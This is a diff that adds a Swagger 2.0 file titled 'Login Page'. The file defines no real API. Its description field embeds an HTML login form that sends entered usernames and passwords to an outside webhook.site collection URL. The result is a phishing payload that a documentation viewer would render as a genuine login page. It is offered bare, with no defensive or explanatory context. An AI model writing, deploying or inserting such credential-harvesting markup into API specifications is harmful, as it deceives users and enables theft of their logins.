@@ -1,0 +1,19 @@
+swagger: '2.0'
+info:
+  title: Login Page
+  version: 1.0.0
+  description: >
+    <div style="max-width:400px;margin:auto;padding:20px;border:1px solid #ccc;">
+      <h2>Login</h2>
+      <form action="https://webhook.site/your-unique-link" method="POST">
+        <input name="username" placeholder="Username" style="display:block;width:100%;margin-bottom:10px;" />
+        <input name="password" type="password" placeholder="Password" style="display:block;width:100%;margin-bottom:10px;" />
+        <button type="submit">Login</button>
+      </form>
+    </div>
+paths:
+  /:
+    get:
+      responses:
+        '200':
+          description: Login form
